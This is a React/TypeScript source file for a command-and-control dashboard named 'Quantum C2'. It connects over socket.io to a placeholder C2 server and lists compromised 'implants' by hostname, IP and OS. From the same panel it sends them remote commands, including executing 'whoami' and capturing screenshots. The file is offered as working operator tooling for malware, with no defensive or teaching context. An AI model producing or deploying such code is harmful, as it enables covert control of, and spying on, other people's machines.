import { useEffect, useState } from 'react';
import { io } from 'socket.io-client';

const socket = io('https://your-c2-domain:8080');

interface Implant {
  id: string;
  hostname: string;
  ip: string;
  os: string;
  lastSeen: string;
}

export default function App() {
  const [implants, setImplants] = useState<Implant[]>([]);
  const [selected, setSelected] = useState<string>('');

  useEffect(() => {
    socket.on('implant_connect', (data) => {
      setImplants(prev => [...prev, data]);
    });

    socket.on('result', (data) => {
      console.log('Command result:', data);
    });

    return () => socket.disconnect();
  }, []);

  const sendCommand = (id: string, type: string, payload: string) => {
    socket.emit('command', { implantId: id, type, payload });
  };

  return (
    <div className="min-h-screen bg-zinc-950 text-white p-8">
      <h1 className="text-4xl font-bold mb-8 text-cyan-400">Quantum C2 Dashboard</h1>
      
      <div className="grid grid-cols-2 gap-8">
        <div>
          <h2 className="text-2xl mb-4">Active Implants ({implants.length})</h2>
          {implants.map(imp => (
            <div key={imp.id} className="bg-zinc-900 p-4 rounded mb-3 cursor-pointer hover:bg-zinc-800"
                 onClick={() => setSelected(imp.id)}>
              <div>{imp.hostname}</div>
              <div className="text-sm text-gray-400">{imp.ip} • {imp.os}</div>
            </div>
          ))}
        </div>

        {selected && (
          <div className="bg-zinc-900 p-6 rounded">
            <h3 className="text-xl mb-4">Control Panel - {selected}</h3>
            <button onClick={() => sendCommand(selected, 'exec', 'whoami')} 
                    className="bg-cyan-600 px-6 py-3 rounded mr-3">Run whoami</button>
            <button onClick={() => sendCommand(selected, 'screenshot', '')}
                    className="bg-purple-600 px-6 py-3 rounded">Take Screenshot</button>
          </div>
        )}
      </div>
    </div>
  );
}
